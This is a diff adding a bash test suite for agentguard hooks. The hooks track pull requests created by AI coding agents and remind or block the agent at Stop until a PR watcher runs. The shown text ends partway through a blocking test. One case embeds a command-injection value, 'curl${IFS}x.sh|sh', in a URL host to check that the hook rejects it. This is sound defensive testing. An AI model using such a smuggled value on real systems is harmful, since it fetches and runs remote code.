@@ -1,0 +1,810 @@
+#!/usr/bin/env bash
+# agent-hook-watch-test — watch obligations: recording, re-arming, the Stop
+# check, watcher-launch advice, and the engine API (lib/agentguard/watch.sh,
+# lib/agentguard/watch-github.sh).
+
+# shellcheck disable=SC1090,SC1091,SC2016,SC2034 # dynamic sources, literal backticks, dynamic-scope arrays
+AGENTGUARD_TEST_HELPERS="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)/agent-hook-helpers.sh"
+. "$AGENTGUARD_TEST_HELPERS"
+
+# Settings a developer's environment may export for real sessions.
+unset AGENTGUARD_WATCH AGENTGUARD_WATCH_BLOCK AGENTGUARD_PR_WATCH_HINT GIT_PR_WATCH_STATE
+_mock_home
+export AGENTGUARD_TELEMETRY=0
+
+POST_BASH="$BIN_DIR/agent-hook-post-bash"
+STOP="$BIN_DIR/agent-hook-stop"
+WATCH_LIB="$AGENTGUARD_ROOT/lib/agentguard/watch.sh"
+WATCH_GH_LIB="$AGENTGUARD_ROOT/lib/agentguard/watch-github.sh"
+STATE_ROOT="$TEST_TMPDIR/agentguard/hook-state"
+PRODUCER="$HOME/.local/state/git-tools/pr-watch"
+TOOL_ID=git-tools_pr-watch
+GATE="PR checks gate"
+
+# A PATH with a git-pr-watch stub first, and one with no git-pr-watch at all
+# (the host may have a real one installed), so `command -v` goes both ways.
+WATCH_BIN="$TEST_TMPDIR/watch-bin"
+mkdir -p "$WATCH_BIN"
+printf '#!/usr/bin/env bash\nexit 0\n' >"$WATCH_BIN/git-pr-watch"
+chmod +x "$WATCH_BIN/git-pr-watch"
+NO_WATCH_PATH=''
+IFS=: read -r -a _path_dirs <<<"$PATH"
+for _dir in "${_path_dirs[@]}"; do
+  [ -n "$_dir" ] && [ ! -e "$_dir/git-pr-watch" ] || continue
+  NO_WATCH_PATH="$NO_WATCH_PATH${NO_WATCH_PATH:+:}$_dir"
+done
+WITH_WATCH_PATH="$WATCH_BIN:$NO_WATCH_PATH"
+
+_seq=0
+# Each case gets its own session. Cases often run inside `$(...)`, where the
+# counter cannot advance for the parent, so the subshell pid and a random
+# number keep ids unique.
+_new_sid() {
+  _seq=$((_seq + 1))
+  SID="$TEST_SID-watch-$_seq-$BASHPID-$RANDOM"
+}
+
+# Runs hook $1 for agent $2 with payload $3 in session $SID. Extra env(1)
+# operands come from the WATCH_ENV array.
+_run() {
+  local hook="$1" agent="$2" payload="${3:-}"
+  local _RUN_HOOK_ENV=(
+    AGENTGUARD_SESSION_ID="$SID"
+    TMPDIR="$TEST_TMPDIR"
+    AGENTGUARD_NAME="$agent"
+    CODEX_THREAD_ID=
+    PATH="${RUN_PATH:-$WITH_WATCH_PATH}"
+    ${WATCH_ENV[@]+"${WATCH_ENV[@]}"}
+  )
+  _run_hook_env "$hook" "$payload"
+}
+WATCH_ENV=()
+
+_session_tool() { printf '%s\n' "$STATE_ROOT/$SID/watch/$TOOL_ID"; }
+
+_payload() {
+  local cmd="$1" out="${2:-}" status="${3:-0}" err="${4:-}"
+  jq -nc --arg cmd "$cmd" --arg out "$out" --arg err "$err" --argjson status "$status" \
+    '{"tool_input":{"command":$cmd},"tool_response":{"stdout":$out,"stderr":$err,"exit_code":$status}}'
+}
+
+_string_payload() {
+  jq -nc --arg cmd "$1" --arg resp "$2" '{tool_input:{command:$cmd},tool_response:$resp}'
+}
+
+_muse_envelope() {
+  jq -nc --arg out "$1" --argjson fields "$2" '{command:"run", output:$out} + $fields'
+}
+
+_context() {
+  printf '%s' "$HOOK_STDOUT" | jq -r '.hookSpecificOutput.additionalContext // empty'
+}
+
+# Writes a session key record directly: key $1, epoch $2, scope $3, label $4.
+_seed_key() {
+  local dir
+  dir=$(_session_tool)
+  mkdir -p "$dir/keys"
+  printf 'git-tools/pr-watch\ngit-pr-watch\nWatch them.\n' >"$dir/tool"
+  printf '%s %s\n%s\n' "$2" "$3" "${4:-$1}" >"$dir/keys/$1"
+}
+
+_key_epoch() {
+  local epoch=''
+  read -r epoch _ 2>/dev/null <"$(_session_tool)/keys/$1" || true
+  printf '%s\n' "$epoch"
+}
+
+# Producer state under $HOME/.local/state (or root $2 for _producer_dir).
+_producer_reset() {
+  rm -rf "$HOME/.local/state/git-tools" "$TEST_TMPDIR/xdg-state"
+  (umask 077 && mkdir -p "$PRODUCER/watchers" "$PRODUCER/done" "$PRODUCER/exited")
+}
+
+# A live process whose argv[1] basename is git-pr-watch, as `bash
+# /path/git-pr-watch --wait` runs. Prints its pid; tests kill that exact pid.
+_start_watcher() {
+  local name="${1:-git-pr-watch}" dir
+  dir="$TEST_TMPDIR/live-$name"
+  mkdir -p "$dir"
+  printf '%s\n' '#!/usr/bin/env bash' "trap 'kill \$c 2>/dev/null; exit 0' TERM" \
+    'sleep 300 & c=$!' 'wait' >"$dir/$name"
+  chmod +x "$dir/$name"
+  bash "$dir/$name" --wait </dev/null >/dev/null 2>&1 &
+  WATCHER_PID=$!
+  # Wait until the process image is the script (bounded).
+  local i
+  for ((i = 0; i < 100; i++)); do
+    if [ -r "/proc/$WATCHER_PID/cmdline" ]; then
+      tr '\0' ' ' <"/proc/$WATCHER_PID/cmdline" | grep -q "$name" && return 0
+    else
+      ps -o command= -p "$WATCHER_PID" 2>/dev/null | grep -q "$name" && return 0
+    fi
+    sleep 0.05
+  done
+  echo "watcher $name did not start" >&2
+}
+
+_stop_watcher() {
+  [ -n "${WATCHER_PID:-}" ] || return 0
+  kill "$WATCHER_PID" 2>/dev/null
+  wait "$WATCHER_PID" 2>/dev/null
+  WATCHER_PID=''
+}
+trap '_stop_watcher; _cleanup' EXIT
+
+# A pid no process can hold (above every supported kernel's pid ceiling).
+DEAD_PID=9004244
+
+echo ""
+echo "=== post-bash: recording created pull requests ==="
+
+URL=https://github.com/Owner/Repo/pull/12
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "$URL")"
+_assert_eq "gh pr create: exits 0" 0 "$HOOK_EXIT"
+_assert_file_content "gh pr create: records the key with its scope and label" \
+  "$(printf '%s owner_repo\n%s' "$(_key_epoch owner_repo_12)" "$URL")" "$(_session_tool)/keys/owner_repo_12"
+_assert_eq "gh pr create: epoch is a number" 1 "$([[ "$(_key_epoch owner_repo_12)" =~ ^[1-9][0-9]+$ ]] && echo 1)"
+_assert_file_content "gh pr create: tool metadata" \
+  "$(printf 'git-tools/pr-watch\ngit-pr-watch\n%s' 'Run `git pr-watch --wait` with these pull requests in the background and act on its result when it exits.')" \
+  "$(_session_tool)/tool"
+_assert_contains "gh pr create: reminder recommends git pr-watch --wait with the label" \
+  "git pr-watch --wait $URL" "$(_context)"
+
+for _case in \
+  "git pr-open --fill" \
+  "git pr-submit" \
+  "git-pr-submit" \
+  "/opt/tools/git-pr-open -t x" \
+  "git -C /tmp/repo pr-open -t x" \
+  "env FOO=1 git pr-submit"; do
+  _new_sid
+  _run "$POST_BASH" claude "$(_payload "$_case" "$URL")"
+  _assert_file_exists "'$_case': records" "$(_session_tool)/keys/owner_repo_12"
+done
+
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "https://git.example.com/Team_A/svc.api/pull/7")"
+_assert_file_exists "enterprise host URL: key from the path, lowercased" "$(_session_tool)/keys/team_a_svc.api_7"
+_assert_eq "enterprise host URL: scope whole" "team_a_svc.api" "$(sed -n '1s/^[0-9]* //p' "$(_session_tool)/keys/team_a_svc.api_7")"
+
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "$(printf 'Creating pull request\n%s\n%s' "$URL" "https://github.com/o/r/pull/13")")"
+_assert_file_exists "two URL lines: first recorded" "$(_session_tool)/keys/owner_repo_12"
+_assert_file_exists "two URL lines: second recorded" "$(_session_tool)/keys/o_r_13"
+
+for _case in \
+  "gh pr create --dry-run --fill|$URL|0" \
+  "git pr-open --dry-run|$URL|0" \
+  "git pr-submit -n|$URL|0" \
+  "git pr-submit --help|$URL|0" \
+  "gh pr create --fill|$URL|1" \
+  "gh pr create --fill|see $URL|0" \
+  "gh pr create --fill|https://github.com/o/r/pull/0|0" \
+  "gh pr view 12|$URL|0" \
+  "cat pr.log|$URL|0"; do
+  IFS='|' read -r _cmd _out _status <<<"$_case"
+  _new_sid
+  _run "$POST_BASH" claude "$(_payload "$_cmd" "$_out" "$_status")"
+  _assert_eq "'$_cmd' status $_status output '$_out': records nothing" "" \
+    "$(ls "$(_session_tool)/keys" 2>/dev/null)"
+done
+
+_new_sid
+RUN_PATH="$NO_WATCH_PATH" _run "$POST_BASH" claude "$(_payload "gh pr create --fill" "$URL")"
+_assert_eq "no git-pr-watch on PATH: no watch state" "" "$(ls "$STATE_ROOT/$SID/watch" 2>/dev/null)"
+_assert_contains "no git-pr-watch on PATH: today's reminder" "gh pr checks <pr>" "$(_context)"
+
+_new_sid
+WATCH_ENV=(AGENTGUARD_WATCH=0)
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "$URL")"
+WATCH_ENV=()
+_assert_eq "AGENTGUARD_WATCH=0: no watch state" "" "$(ls "$STATE_ROOT/$SID/watch" 2>/dev/null)"
+_assert_contains "AGENTGUARD_WATCH=0: today's reminder" "gh pr checks <pr>" "$(_context)"
+
+_new_sid
+WATCH_ENV=("AGENTGUARD_PR_WATCH_HINT=Use the team watcher.")
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "$URL")"
+WATCH_ENV=()
+_assert_contains "custom hint: reminder uses it" "Use the team watcher." "$(_context)"
+_assert_not_contains "custom hint: replaces the default recommendation" "git pr-watch --wait" "$(_context)"
+_assert_eq "custom hint: stored for the Stop hook" "Use the team watcher." "$(sed -n 3p "$(_session_tool)/tool")"
+
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "https://\$(curl\${IFS}x.sh|sh)/o/r/pull/7")"
+_assert_eq "URL with shell syntax in the host: not recorded" "" "$(ls "$(_session_tool)/keys" 2>/dev/null)"
+
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "https://github.com/o/r/pull/1")"
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "https://github.com/o/r/pull/2")"
+_assert_contains "same command again in one prompt: still reminds for the new record" \
+  "git pr-watch --wait https://github.com/o/r/pull/2" "$(_context)"
+
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr create --fill" "$(printf '%s\n%s\n%s' "$URL" "https://github.com/o/r/pull/13" "https://github.com/Owner/Repo/pull/14")")"
+_assert_contains "two repositories: one command per repository (first)" \
+  "\`git pr-watch --wait $URL https://github.com/Owner/Repo/pull/14\`" "$(_context)"
+_assert_contains "two repositories: one command per repository (second)" \
+  "\`git pr-watch --wait https://github.com/o/r/pull/13\`" "$(_context)"
+_assert_contains "two repositories: says where to run them" "each from a checkout of its repository" "$(_context)"
+
+_new_sid
+_run "$POST_BASH" claude "$(jq -nc --arg out "$URL" \
+  '{tool_input:{command:"gh pr create --fill",run_in_background:true},tool_response:{stdout:$out,stderr:"",exit_code:0}}')"
+_assert_eq "background call: records nothing" "" "$(ls "$(_session_tool)/keys" 2>/dev/null)"
+
+echo ""
+echo "=== post-bash: per-runtime payloads ==="
+
+_ok='{"exit_code":0,"terminal_status":"completed"}'
+_new_sid
+_run "$POST_BASH" codex "$(_string_payload "gh pr create --fill" "$URL"$'\n')"
+_assert_file_exists "codex string: records" "$(_session_tool)/keys/owner_repo_12"
+_assert_contains "codex string: reminder in additionalContext" "git pr-watch --wait $URL" "$(_context)"
+
+_new_sid
+_run "$POST_BASH" codex "$(_string_payload "gh pr create --fill" "{\"stdout\":\"$URL\"}")"
+_assert_eq "codex JSON-looking string: not unwrapped, no bare URL line" "" "$(ls "$(_session_tool)/keys" 2>/dev/null)"
+
+_new_sid
+_run "$POST_BASH" codex "$(_string_payload "gh pr create --fill" "$(_muse_envelope "$URL" "$_ok")")"
+_assert_eq "codex Muse-envelope-looking string: not unwrapped" "" "$(ls "$(_session_tool)/keys" 2>/dev/null)"
+
+_new_sid
+_run "$POST_BASH" muse "$(_string_payload "gh pr create --fill" "$(_muse_envelope "$URL"$'\n' "$_ok")")"
+_assert_file_exists "muse envelope: records" "$(_session_tool)/keys/owner_repo_12"
+
+_new_sid
+_run "$POST_BASH" muse "$(_string_payload "gh pr create --fill" "$(_muse_envelope "$URL" '{"exit_code":1,"terminal_status":"failed"}')")"
+_assert_eq "muse failed envelope: records nothing" "" "$(ls "$(_session_tool)/keys" 2>/dev/null)"
+
+echo ""
+echo "=== post-bash: gh pr ready, reopen, and update-branch re-arms ==="
+
+_producer_reset
+# Seeds three keys with an old epoch, runs the command, and prints which keys
+# re-armed (epoch moved), sorted.
+_rearmed_by() {
+  local key
+  _new_sid
+  _seed_key o_r_12 1000 o_r
+  _seed_key o_r_13 1000 o_r
+  _seed_key x_y_12 1000 x_y
+  _run "$POST_BASH" claude "$(_payload "$1" "${2:-}")"
+  for key in o_r_12 o_r_13 x_y_12; do
+    [ "$(_key_epoch "$key")" = 1000 ] || printf '%s ' "$key"
+  done
+}
+for _case in \
+  "gh pr ready https://github.com/O/R/pull/12|o_r_12 " \
+  "gh pr reopen https://github.example.com/o/r/pull/12/files|o_r_12 " \
+  "gh pr ready 12 -R o/r|o_r_12 " \
+  "gh pr ready 12 --repo=O/R|o_r_12 " \
+  "gh -R github.example.com/o/r pr update-branch 13|o_r_13 " \
+  "gh pr update-branch '#12'|o_r_12 x_y_12 " \
+  "gh pr reopen 12|o_r_12 x_y_12 " \
+  "gh pr ready feature/x|o_r_12 o_r_13 x_y_12 " \
+  "gh pr ready|o_r_12 o_r_13 x_y_12 " \
+  "gh pr reopen --comment why 12|o_r_12 x_y_12 " \
+  "gh pr reopen -c 'a reason' https://github.com/o/r/pull/12|o_r_12 " \
+  "gh pr ready 12 --undo|" \
+  "gh pr ready 99 -R o/r|" \
+  "gh pr view 12|"; do
+  _cmd="${_case%%|*}"
+  _assert_eq "'$_cmd' re-arms" "${_case#*|}" "$(_rearmed_by "$_cmd")"
+done
+
+# A merged or closed pull request is skipped by ALL and scope re-arms; only a
+# per-key re-arm (a URL, or -R plus a number, or a bare number) revives it.
+printf '%s merged 2000\n' "$(printf 'a%.0s' {1..40})" >"$PRODUCER/done/o_r_12"
+_assert_eq "terminal key: ALL skips it" "o_r_13 x_y_12 " "$(_rearmed_by "gh pr ready")"
+_assert_eq "terminal key: URL revives it" "o_r_12 " "$(_rearmed_by "gh pr reopen https://github.com/o/r/pull/12")"
+_assert_eq "terminal key: bare number revives it" "o_r_12 x_y_12 " "$(_rearmed_by "gh pr reopen 12")"
+_assert_eq "terminal key: reopen with a comment first revives it" "o_r_12 " \
+  "$(_rearmed_by "gh pr reopen --comment again https://github.com/o/r/pull/12")"
+_assert_eq "terminal key: quiet push (ALL) skips it" "o_r_13 x_y_12 " "$(_rearmed_by "git push" "")"
+_producer_reset
+
+_new_sid
+_run "$POST_BASH" claude "$(_payload "gh pr ready https://github.com/o/r/pull/12")"
+_assert_eq "no recorded keys: gh pr ready creates no watch state" "" "$(ls "$STATE_ROOT/$SID/watch" 2>/dev/null)"
+_assert_contains "no recorded keys: today's reminder" "gh pr checks <pr>" "$(_context)"
+
+echo ""
+echo "=== post-bash: push re-arms ==="
+
+# Seeds o_r_12 (scope o_r) and x_y_5 (scope x_y) with an old epoch, runs a
+# push with output $2 on stderr and status $3, and prints the re-armed keys.
+_push_rearms() {
+  local cmd="$1" err="$2" status="${3:-0}" key
+  _new_sid
+  _seed_key o_r_12 1000 o_r
+  _seed_key x_y_5 1000 x_y
+  _run "$POST_BASH" claude "$(_payload "$cmd" "" "$status" "$err")"
+  for key in o_r_12 x_y_5; do
+    [ "$(_key_epoch "$key")" = 1000 ] || printf '%s ' "$key"
+  done
+}
+_ff=$'To github.com:O/R.git\n   1111111..2222222  main -> main'
+_assert_eq "fast-forward push" "o_r_12 " "$(_push_rearms "git push" "$_ff")"
+_assert_eq "CRLF push output" "o_r_12 " "$(_push_rearms "git push" $'To https://github.com/o/r.git\r\n * [new branch]      HEAD -> fix/x\r')"
+_assert_eq "everything up-to-date" "" "$(_push_rearms "git push" "Everything up-to-date")"
+_assert_eq "-v up-to-date" "" "$(_push_rearms "git push -v" $'Pushing to github.com:o/r.git\nTo github.com:o/r.git\n = [up to date]      main -> main')"
+_assert_eq "rejected only" "" "$(_push_rearms "git push" $'To github.com:o/r.git\n ! [rejected]        main -> main (fetch first)')"
+_assert_eq "porcelain" "o_r_12 " "$(_push_rearms "git push --porcelain" $'To https://github.com/o/r.git\n \trefs/heads/main:refs/heads/main\t1111111..2222222\nDone')"
+_assert_eq "porcelain up-to-date" "" "$(_push_rearms "git push --porcelain" $'To https://github.com/o/r.git\n=\trefs/heads/main:refs/heads/main\t[up to date]\nDone')"
+_assert_eq "porcelain tag only" "" "$(_push_rearms "git push --porcelain --tags" $'To https://github.com/o/r.git\n*\trefs/tags/v1:refs/tags/v1\t[new tag]\nDone')"
+_assert_eq "dry run" "" "$(_push_rearms "git push --dry-run" "$_ff")"
+_assert_eq "multiple URLs" "o_r_12 x_y_5 " "$(_push_rearms "git push" "$_ff"$'\nTo https://github.com/x/y\n + 1111111...2222222 main -> main (forced update)')"
+_assert_eq "fork with the same repository name" "o_r_12 " "$(_push_rearms "git push fork" $'To github.com:me/r.git\n * [new branch]      HEAD -> fix/x')"
+_assert_eq "unrelated repository" "" "$(_push_rearms "git push" $'To github.com:me/other.git\n * [new branch]      HEAD -> fix/x')"
+_assert_eq "quiet push re-arms everything" "o_r_12 x_y_5 " "$(_push_rearms "git push -q" "")"
+_assert_eq "scp alias" "o_r_12 " "$(_push_rearms "git push" $'To gh-work:O/R.git\n   1111111..2222222  main -> main')"
+_assert_eq "tag only" "" "$(_push_rearms "git push origin v1" $'To github.com:o/r.git\n * [new tag]         v1 -> v1')"
+_assert_eq "failed push" "" "$(_push_rearms "git push" "$_ff" 1)"
+_assert_eq "git pr-restack" "o_r_12 " "$(_push_rearms "git pr-restack 12" "$_ff")"
+_assert_eq "git pr-sync-stack" "o_r_12 " "$(_push_rearms "git pr-sync-stack" "$_ff")"
+_assert_eq "git pr-restack --no-push" "" "$(_push_rearms "git pr-restack --no-push 12" "$_ff")"
+_assert_eq "git pr-restack -n" "" "$(_push_rearms "git pr-restack -n 12" "$_ff")"
+_assert_eq "stack tool with nothing to push" "" "$(_push_rearms "git pr-sync-stack" "Nothing to sync.")"
+_assert_eq "push run in the background" "" "$(
+  _new_sid
+  _seed_key o_r_12 1000 o_r
+  _run "$POST_BASH" claude "$(jq -nc '{tool_input:{command:"git push",run_in_background:true},tool_response:{stdout:"",stderr:"",exit_code:0}}')"
+  [ "$(_key_epoch o_r_12)" = 1000 ] || printf 'o_r_12 '
+)"
+_new_sid
+_seed_key o_r_12 1000 o_r
+_run "$POST_BASH" claude "$(_payload "git push" "" 0 "$_ff")"
+_seed_key o_r_12 1000 o_r
+_run "$POST_BASH" claude "$(_payload "git push" "" 0 "$_ff")"
+_assert_contains "second identical push in one prompt: reminds again" "git pr-watch --wait o_r_12" "$(_context)"
+_assert_eq "push summary in stdout of a codex string" "o_r_12 " "$(
+  _new_sid
+  _seed_key o_r_12 1000 o_r
+  _run "$POST_BASH" codex "$(_string_payload "git push" "$_ff")"
+  [ "$(_key_epoch o_r_12)" = 1000 ] || printf 'o_r_12 '
+)"
+_new_sid
+_run "$POST_BASH" claude "$(_payload "git push" "" 0 "$_ff")"
+_assert_eq "push without recorded keys: no watch state" "" "$(ls "$STATE_ROOT/$SID/watch" 2>/dev/null)"
+_new_sid
+_seed_key o_r_12 1000 o_r
+_run "$POST_BASH" claude "$(_payload "git push" "" 0 "$_ff")"
+_assert_contains "push re-arm: reminder names the re-armed label" "git pr-watch --wait o_r_12" "$(_context)"
+
+echo ""
+echo "=== stop: watch obligations ==="
+
+# Runs the Stop hook for agent $1 (default claude) with payload $2.
+_stop() {
+  _run "$STOP" "${1:-claude}" "${2:-{\}}"
+}
+_new_prompt() { rm -rf "$STATE_ROOT/$SID/prompt-cycle"; }
+
+_producer_reset
+_new_sid
+_stop
+_assert_eq "no watch state: exits 0" 0 "$HOOK_EXIT"
+_assert_not_contains "no watch state: silent" "REMINDER" "$HOOK_STDERR"
+
+_new_sid
+_seed_key o_r_12 1000 o_r https://github.com/o/r/pull/12
+_stop
+_assert_eq "unwatched: exits 0" 0 "$HOOK_EXIT"
+_assert_contains "unwatched: reminds with the label" "https://github.com/o/r/pull/12" "$HOOK_STDERR"
+_assert_contains "unwatched: reminds with the hint" "Watch them." "$HOOK_STDERR"
+_assert_eq "unwatched: stdout stays a plain response" "{}" "$HOOK_STDOUT"
+_stop
+_assert_not_contains "unwatched: once per prompt" "REMINDER" "$HOOK_STDERR"
+_new_prompt
+_stop
+_assert_contains "unwatched: again after a new prompt" "REMINDER" "$HOOK_STDERR"
+_new_prompt
+_seed_key o_r_12 1001 o_r https://github.com/o/r/pull/12
+_stop
+_assert_contains "new submit: reminds" "REMINDER" "$HOOK_STDERR"
+
+# Each case: seed o_r_12 (scope o_r, epoch 1000) and x_9 (scope -, epoch
+# 1000), set up producer state, and report which keys the Stop names.
+_unmet_after() {
+  local out=''
+  _new_sid
+  _seed_key o_r_12 1000 o_r KEY_A
+  _seed_key x_9 1000 - KEY_B
+  _stop "${STOP_AGENT:-claude}"
+  case "$HOOK_STDERR" in *KEY_A*) out="${out}a" ;; esac
+  case "$HOOK_STDERR" in *KEY_B*) out="${out}b" ;; esac
+  printf '%s\n' "${out:-none}"
+}
+
+_producer_reset
+_start_watcher
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/o_r_12.$WATCHER_PID"
+_assert_eq "live watcher covers its key only" "b" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/o_r_12.$WATCHER_PID"
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/pending.$WATCHER_PID"
+_assert_eq "unscoped pending covers every key" "none" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/pending.$WATCHER_PID"
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/pending.o_r.$WATCHER_PID"
+_assert_eq "scoped pending covers its scope, not the unscoped key" "b" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/pending.o_r.$WATCHER_PID"
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/pending.x_y.$WATCHER_PID"
+_assert_eq "scoped pending of another scope covers nothing" "ab" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/pending.x_y.$WATCHER_PID"
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/o_r_12.$WATCHER_PID~123.AbCdEf"
+_assert_eq "temporary watcher file is ignored" "ab" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/o_r_12.$WATCHER_PID~123.AbCdEf"
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/o_r_123.$WATCHER_PID"
+_assert_eq "another key sharing a prefix covers nothing" "ab" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/o_r_123.$WATCHER_PID"
+_stop_watcher
+
+printf '%s\n' "$DEAD_PID" >"$PRODUCER/watchers/o_r_12.$DEAD_PID"
+_assert_eq "dead watcher covers nothing" "ab" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/o_r_12.$DEAD_PID"
+printf '%s\n' "$$" >"$PRODUCER/watchers/o_r_12.$$"
+_assert_eq "live process with another name covers nothing" "ab" "$(_unmet_after)"
+rm -f "$PRODUCER/watchers/o_r_12.$$"
+
+# A scope containing a dot: the pid is the last field.
+_start_watcher
+printf '%s\n' "$WATCHER_PID" >"$PRODUCER/watchers/pending.o_r.js.$WATCHER_PID"
+_assert_eq "scope with a dot: pending matches whole scope" "none" "$(
+  _new_sid
+  _seed_key o_r.js_4 1000 o_r.js KEY_C
+  _stop
+  case "$HOOK_STDERR" in *KEY_C*) echo c ;; *) echo none ;; esac
+)"
+rm -f "$PRODUCER/watchers/pending.o_r.js.$WATCHER_PID"
+_stop_watcher
+
+_commit=$(printf 'b%.0s' {1..40})
+printf '%s green 1001\n' "$_commit" >"$PRODUCER/done/o_r_12"
+_assert_eq "done after the submit satisfies" "b" "$(_unmet_after)"
+printf '%s green 1000\n' "$_commit" >"$PRODUCER/done/o_r_12"
+_assert_eq "done in the submit's second does not" "ab" "$(_unmet_after)"
+printf '%s green -\n' "$_commit" >"$PRODUCER/done/o_r_12"
+_assert_eq "done with an unknown epoch does not" "ab" "$(_unmet_after)"
+printf -- '- closed 999\n' >"$PRODUCER/done/o_r_12"
+_assert_eq "done before the submit does not" "ab" "$(_unmet_after)"
+printf '%s merged 5000\n' "$_commit" >"$PRODUCER/done/x_9"
+rm -f "$PRODUCER/done/o_r_12"
+_assert_eq "done for the unscoped key satisfies it" "a" "$(_unmet_after)"
+_producer_reset
+
+# The engine reads both candidate roots: an absolute XDG_STATE_HOME the hook
+# sees, and ~/.local/state.
+mkdir -p "$TEST_TMPDIR/xdg-state/git-tools/pr-watch/done"
+printf '%s green 1001\n' "$_commit" >"$TEST_TMPDIR/xdg-state/git-tools/pr-watch/done/o_r_12"
+WATCH_ENV=(XDG_STATE_HOME="$TEST_TMPDIR/xdg-state")
+_assert_eq "done under XDG_STATE_HOME counts" "b" "$(_unmet_after)"
+WATCH_ENV=(XDG_STATE_HOME=relative/state)
+_assert_eq "relative XDG_STATE_HOME is ignored" "ab" "$(_unmet_after)"
+WATCH_ENV=()
+_producer_reset
+
+# State the engine cannot trust enforces nothing rather than reading as "no
+# watcher".
+rm -rf "$HOME/.local/state/git-tools"
+mkdir -p "$TEST_TMPDIR/elsewhere/pr-watch/watchers" "$HOME/.local/state/git-tools"
+ln -s "$TEST_TMPDIR/elsewhere/pr-watch" "$PRODUCER"
+_assert_eq "symlinked producer dir: enforces nothing" "none" "$(_unmet_after)"
+rm -f "$PRODUCER"
+mkdir -p "$PRODUCER"
+: >"$PRODUCER/done"
+_assert_eq "producer subdir that is a file: enforces nothing" "none" "$(_unmet_after)"
+_producer_reset
+ln -s "$TEST_TMPDIR/elsewhere" "$TEST_TMPDIR/state-link"
+WATCH_ENV=(XDG_STATE_HOME="$TEST_TMPDIR/state-link")
+_assert_eq "symlinked state root: enforces nothing" "none" "$(_unmet_after)"
+WATCH_ENV=(-u HOME)
+_assert_eq "no absolute state root: enforces nothing" "none" "$(_unmet_after)"
+WATCH_ENV=()
+rm -rf "$HOME/.local/state"
+_assert_eq "no producer state at all: enforces" "ab" "$(_unmet_after)"
+_producer_reset
+printf '%s green 1001\n' "$_commit" >"$PRODUCER/done/o_r_12"
+ln -sf /dev/null "$PRODUCER/done/x_9"
+_assert_eq "symlinked done record is not trusted" "b" "$(_unmet_after)"
+_producer_reset
+
+_new_sid
+_seed_key o_r_12 1000 o_r KEY_A
+_stop claude '{"subagent_type":"general-purpose"}'
+_assert_not_contains "subagent Stop: silent" "KEY_A" "$HOOK_STDERR"
+_stop claude '{"hook_event_name":"SubagentStop"}'
+_assert_not_contains "SubagentStop event: silent" "KEY_A" "$HOOK_STDERR"
+WATCH_ENV=(AGENTGUARD_WATCH=0)
+_stop
+_assert_not_contains "AGENTGUARD_WATCH=0: silent" "KEY_A" "$HOOK_STDERR"
+WATCH_ENV=(GIT_PR_WATCH_STATE=0 AGENTGUARD_WATCH_BLOCK=1)
+_stop
+_assert_eq "GIT_PR_WATCH_STATE=0: never blocks" 0 "$HOOK_EXIT"
+_assert_contains "GIT_PR_WATCH_STATE=0: says so" "GIT_PR_WATCH_STATE=0" "$HOOK_STDERR"
+_assert_not_contains "GIT_PR_WATCH_STATE=0: no unwatched reminder" "Not watched" "$HOOK_STDERR"
+WATCH_ENV=(GIT_PR_WATCH_STATE=1)
+_new_prompt
+_stop
+_assert_contains "GIT_PR_WATCH_STATE=1: reminds" "Not watched" "$HOOK_STDERR"
+WATCH_ENV=()
+
+echo ""
+echo "=== stop: opt-in blocking ==="
+
+_new_sid
+_seed_key o_r_12 1000 o_r KEY_A
+WATCH_ENV=(AGENTGUARD_WATCH_BLOCK=1)
+_stop
+_assert_eq "block: first Stop blocks" 2 "$HOOK_EXIT"
+_assert_contains "block: names the label" "KEY_A" "$HOOK_STDERR"
+_assert_contains "block: BLOCKED prefix" "BLOCKED:" "$HOOK_STDERR"
+_stop
+_assert_eq "block: second Stop for the same submit ends the turn" 0 "$HOOK_EXIT"
+_new_prompt
+_stop
+_assert_eq "block: a new prompt alone does not re-arm" 0 "$HOOK_EXIT"
+_assert_contains "block: but reminds" "KEY_A" "$HOOK_STDERR"
+sleep 1
+_seed_key o_r_12 1001 o_r KEY_A
+_new_prompt
+_stop
+_assert_eq "block: a new submit re-arms" 2 "$HOOK_EXIT"
+_stop
+_assert_eq "block: then ends again" 0 "$HOOK_EXIT"
+sleep 1
+_producer_reset
+printf '1 action failed\n' >"$PRODUCER/exited/o_r_12"
+_new_prompt
+_stop
+_assert_eq "block: a watcher exit re-arms" 2 "$HOOK_EXIT"
+_producer_reset
+for _agent in codex muse gemini agent; do
+  _new_sid
+  _seed_key o_r_12 1000 o_r KEY_A
+  _stop "$_agent"
+  _assert_eq "block: $_agent never blocks" 0 "$HOOK_EXIT"
+  _assert_contains "block: $_agent reminds" "KEY_A" "$HOOK_STDERR"
+done
+WATCH_ENV=()
+_new_sid
+_seed_key o_r_12 1000 o_r KEY_A
+_stop
+_assert_eq "no AGENTGUARD_WATCH_BLOCK: reminder only" 0 "$HOOK_EXIT"
+if [ "$(id -u)" != 0 ]; then
+  _new_sid
+  _seed_key o_r_12 1000 o_r KEY_A
+  chmod 500 "$(_session_tool)"
+  WATCH_ENV=(AGENTGUARD_WATCH_BLOCK=1)
+  _stop
+  WATCH_ENV=()
+  chmod 700 "$(_session_tool)"
